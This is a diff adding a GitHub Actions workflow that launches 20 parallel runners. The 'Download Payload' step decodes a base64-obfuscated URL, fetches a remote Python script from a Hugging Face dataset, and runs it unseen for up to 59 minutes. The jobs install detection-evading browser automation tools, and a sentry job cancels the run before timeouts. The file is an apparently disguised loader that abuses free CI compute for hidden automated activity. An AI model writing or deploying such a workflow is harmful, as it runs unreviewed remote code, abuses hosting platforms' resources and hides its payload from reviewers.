@@ -1,0 +1,103 @@
+name: Titanium Wraith Cluster
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: titanium-wraith-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Wraith Sentry: stands by 59 minutes, then aborts the whole run
+  # =================================================================
+  wraith-sentry:
+    name: "Wraith Sentry"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      SENTRY_DELAY: 3540
+    steps:
+      - name: Sentry Standby
+        run: |
+          echo "[SENTRY] Sentry standing by for run: ${{ github.run_id }}"
+          echo "[SENTRY] Delay armed for ${SENTRY_DELAY} seconds before the cutoff mark."
+
+          sleep "${SENTRY_DELAY}"
+
+          echo "[SENTRY] Cutoff mark passed — issuing abort order."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[SENTRY] Abort order issued. Every running and queued job will be aborted."
+
+  # =================================================================
+  # Wraith Cluster: parallel cluster instances
+  # =================================================================
+  wraith-cluster:
+    name: "Cluster-${{ matrix.instance_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        instance_id: [C-ALPHA-1, C-BRAVO-2, C-CHARLIE-3, C-DELTA-4, C-ECHO-5, C-FOXTROT-6, C-GOLF-7, C-HOTEL-8, C-INDIA-9, C-JULIET-10, C-KILO-11, C-LIMA-12, C-MIKE-13, C-NOVEMBER-14, C-OSCAR-15, C-PAPA-16, C-QUEBEC-17, C-ROMEO-18, C-SIERRA-19, C-TANGO-20]
+
+    steps:
+      # ---------------------------------------------------------------
+      # a) Prepare instance
+      # ---------------------------------------------------------------
+      - name: Prepare Instance
+        run: |
+          echo "[PREP] Preparing Cluster-${{ matrix.instance_id }} ..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # ---------------------------------------------------------------
+      # b) Download payload
+      # ---------------------------------------------------------------
+      - name: Download Payload
+        run: |
+          echo "[DOWNLOAD] Downloading cluster payload..."
+          REMOTE_BLOB=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$REMOTE_BLOB" -o cluster_blob.py
+          echo "[DOWNLOAD] Payload downloaded."
+
+      # ---------------------------------------------------------------
+      # c) Install dependencies
+      # ---------------------------------------------------------------
+      - name: Install Dependencies
+        run: |
+          echo "[DEPS] Installing dependencies..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # ---------------------------------------------------------------
+      # d) Launch instance (3540s cap)
+      # ---------------------------------------------------------------
+      - name: Launch Instance
+        run: |
+          echo ">> Launching Cluster-${{ matrix.instance_id }} ..."
+
+          python3 cluster_blob.py &
+          CLUSTER_PID=$!
+
+          echo ">> Instance launched. Cap: 3540 seconds."
+
+          sleep 3540
+
+          if kill -0 "$CLUSTER_PID" 2>/dev/null; then
+            echo ">> Cap reached — stopping instance."
+            kill -9 "$CLUSTER_PID"
+            echo ">> Instance stopped by cap supervisor."
+          else
+            echo ">> Instance exited before the cap."
+          fi
